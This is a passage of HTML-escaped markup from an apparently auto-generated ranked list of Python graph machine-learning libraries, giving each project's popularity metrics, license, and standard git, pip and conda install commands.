href=&#34;https://github.com/dmlc/dgl&#34;&gt;dgl&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 9.6K) - Python package built to ease deep learning on graph, on top of existing.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dmlc/dgl&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 210 · 🔀 2.3K · 📦 6 · 📋 1.6K - 15% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dmlc/dgl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dgl&#34;&gt;PyPi&lt;/a&gt; (📥 26K / month · 📦 45 · ⏱️ 16.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dgl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/stellargraph/stellargraph&#34;&gt;StellarGraph&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.4K · 💤) - StellarGraph - Machine Learning on Graphs. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/stellargraph/stellargraph&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 360 · 📦 140 · 📋 1K - 27% open · ⏱️ 29.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/stellargraph/stellargraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/stellargraph&#34;&gt;PyPi&lt;/a&gt; (📥 20K / month · 📦 5 · ⏱️ 30.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install stellargraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/graphistry/pygraphistry&#34;&gt;pygraphistry&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 1.6K) - PyGraphistry is a Python library to quickly load, shape,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/graphistry/pygraphistry&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 160 · 📦 69 · 📋 210 - 42% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/graphistry/pygraphistry&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/graphistry&#34;&gt;PyPi&lt;/a&gt; (📥 2.9K / month · 📦 4 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install graphistry&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/snap-stanford/ogb&#34;&gt;ogb&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 1.3K) - Benchmark datasets, data loaders, and evaluators for graph machine learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/snap-stanford/ogb&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 290 · 📦 300 · 📋 210 - 3% open · ⏱️ 14.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/snap-stanford/ogb&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ogb&#34;&gt;PyPi&lt;/a&gt; (📥 11K / month · 📦 13 · ⏱️ 23.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ogb&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ogb&#34;&gt;Conda&lt;/a&gt; (📥 7.9K · ⏱️ 23.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ogb&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PGL&#34;&gt;Paddle Graph Learning&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 1.3K) - Paddle Graph Learning (PGL) is an efficient and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PGL&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 26 · 🔀 240 · 📦 26 · 📋 120 - 39% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/PGL&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pgl&#34;&gt;PyPi&lt;/a&gt; (📥 7.1K / month · 📦 2 · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pgl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/danielegrattarola/spektral&#34;&gt;Spektral&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 2.1K) - Graph Neural Networks with Keras and Tensorflow 2. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/danielegrattarola/spektral&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 280 · 📦 120 · 📋 230 - 19% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/danielegrattarola/spektral&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/spektral&#34;&gt;PyPi&lt;/a&gt; (📥 6.8K / month · 📦 2 · ⏱️ 09.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install spektral&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pykeen/pykeen&#34;&gt;PyKEEN&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 860) - A Python library for learning and evaluating knowledge graph embeddings. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pykeen/pykeen&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 120 · 📥 140 · 📋 400 - 30% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pykeen/pykeen&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pykeen&#34;&gt;PyPi&lt;/a&gt; (📥 1.6K / month · 📦 3 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pykeen&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/PyTorch-BigGraph&#34;&gt;PyTorch-BigGraph&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 3.1K) - Generate embeddings from large-scale graph-structured.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/PyTorch-BigGraph&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 410 · 📥 130 · 📋 190 - 28% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/PyTorch-BigGraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchbiggraph&#34;&gt;PyPi&lt;/a&gt; (📥 280K / month · 📦 3 · ⏱️ 01.05.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchbiggraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/benedekrozemberczki/pytorch_geometric_temporal&#34;&gt;pytorch_geometric_temporal&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 1.6K) - PyTorch Geometric Temporal: Spatiotemporal Signal.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/benedekrozemberczki/pytorch_geometric_temporal&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 230 · 📋 110 - 10% open · ⏱️ 24.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/benedekrozemberczki/pytorch_geometric_temporal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch-geometric-temporal&#34;&gt;PyPi&lt;/a&gt; (📥 2.3K / month · 📦 2 · ⏱️ 04.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch-geometric-temporal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Accenture/AmpliGraph&#34;&gt;AmpliGraph&lt;/a&gt;&lt;/b&gt; (🥈24 · ⭐ 1.8K · 💤) - Python library for Representation Learning on Knowledge.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Accenture/AmpliGraph&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 200 · 📦 20 · 📋 200 - 10% open · ⏱️ 25.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Accenture/AmpliGraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ampligraph&#34;&gt;PyPi&lt;/a&gt; (📥 1.1K / month · ⏱️ 25.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ampligraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/graph4ai/graph4nlp&#34;&gt;graph4nlp&lt;/a&gt;&lt;/b&gt; (🥈23 · ⭐ 1.3K) - Graph4nlp is the library for the easy use of Graph Neural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/graph4ai/graph4nlp&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 160 · 📋 150 - 9% open · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/graph4ai/graph4nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/graph4nlp&#34;&gt;PyPi&lt;/a&gt; (📥 100 / month · ⏱️ 20.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install graph4nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/eliorc/node2vec&#34;&gt;Node2Vec&lt;/a&gt;&lt;/b&gt; (🥈23 · ⭐ 910) - Implementation of the node2vec algorithm. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/eliorc/node2vec&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 210 · ⏱️ 30.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/eliorc/node2vec&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/node2vec&#34;&gt;PyPi&lt;/a&gt; (📥 150K / month · 📦 15 · ⏱️ 30.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install node2vec&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/node2vec&#34;&gt;Conda&lt;/a&gt; (📥 21K · ⏱️ 25.04.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge node2vec&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rusty1s/pytorch_cluster&#34;&gt;torch-cluster&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 520) - PyTorch Extension Library of Optimized Graph Cluster.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rusty1s/pytorch_cluster&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 95 · 📋 100 - 13% open · ⏱️ 20.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rusty1s/pytorch_cluster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch-cluster&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 27 · ⏱️ 11.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch-cluster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytorch_cluster&#34;&gt;Conda&lt;/a&gt; (📥 31K · ⏱️ 06.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytorch_cluster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/jraph&#34;&gt;jraph&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 900) - A Graph Neural Network Library in Jax. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepmind/jraph&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 58 · 📦 18 · 📋 22 - 45% open · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepmind/jraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/jraph&#34;&gt;PyPi&lt;/a&gt; (📥 1.5K / month · 📦 2 · ⏱️ 19.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install jraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/jraph&#34;&gt;Conda&lt;/a&gt; (📥 390 · ⏱️ 31.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge jraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/snap-stanford/deepsnap&#34;&gt;deepsnap&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 420 · 💤) - Python library assists deep learning on graphs. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/snap-stanford/deepsnap&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 46 · 📥 8 · 📦 21 · 📋 39 - 38% open · ⏱️ 19.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/snap-stanford/deepsnap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deepsnap&#34;&gt;PyPi&lt;/a&gt; (📥 430 / month · 📦 1 · ⏱️ 05.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deepsnap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/THUMNLab/AutoGL&#34;&gt;AutoGL&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 800) - An autoML framework &amp;amp; toolkit for machine learning on graphs. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/THUMNLab/AutoGL&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 91 · 📋 20 - 30% open · ⏱️ 19.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/THUMNLab/AutoGL&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/auto-graph-learning&#34;&gt;PyPi&lt;/a&gt; (📥 6 / month · ⏱️ 23.12.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install auto-graph-learning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/snap-stanford/GraphGym&#34;&gt;GraphGym&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 1K) - Platform for designing and evaluating Graph Neural Networks (GNN). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/snap-stanford/GraphGym&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 5 · 🔀 120 · 📥 13 · 📦 2 · 📋 26 - 15% open · ⏱️ 25.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/snap-stanford/GraphGym&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/graphgym&#34;&gt;PyPi&lt;/a&gt; (📥 56 / month · ⏱️ 24.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install graphgym&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/vaticle/kglib&#34;&gt;kglib&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 500 · 💤) - Grakn Knowledge Graph Library (ML R&amp;amp;D). &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/vaticle/kglib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 88 · 📥 210 · 📋 62 - 19% open · ⏱️ 22.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/vaticle/kglib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/grakn-kglib&#34;&gt;PyPi&lt;/a&gt; (📥 44 / month · ⏱️ 19.08.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install grakn-kglib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/ptgnn&#34;&gt;ptgnn&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 320) - A PyTorch Graph Neural Network Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/ptgnn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 38 · 📦 1 · 📋 7 - 28% open · ⏱️ 01.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/ptgnn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ptgnn&#34;&gt;PyPi&lt;/a&gt; (📥 97 / month · ⏱️ 21.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ptgnn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 15 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/igraph/python-igraph&#34;&gt;igraph&lt;/a&gt;&lt;/b&gt; (🥇31 · ⭐ 970) - Python interface for igraph. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2KucAZR&#34;&gt;❗️GPL-2.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Kozea/pygal&#34;&gt;pygal&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.5K) - PYthon svg GrAph plotting Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/37RvQcA&#34;&gt;❗️LGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/benedekrozemberczki/karateclub&#34;&gt;Karate Club&lt;/a&gt;&lt;/b&gt; (🥈23 · ⭐ 1.6K) - Karate Club: An API Oriented Open-source Python Framework for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/divelab/DIG&#34;&gt;DIG&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.1K) - A library for graph deep learning research. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/phanein/deepwalk&#34;&gt;DeepWalk&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 2.4K · 💀) - 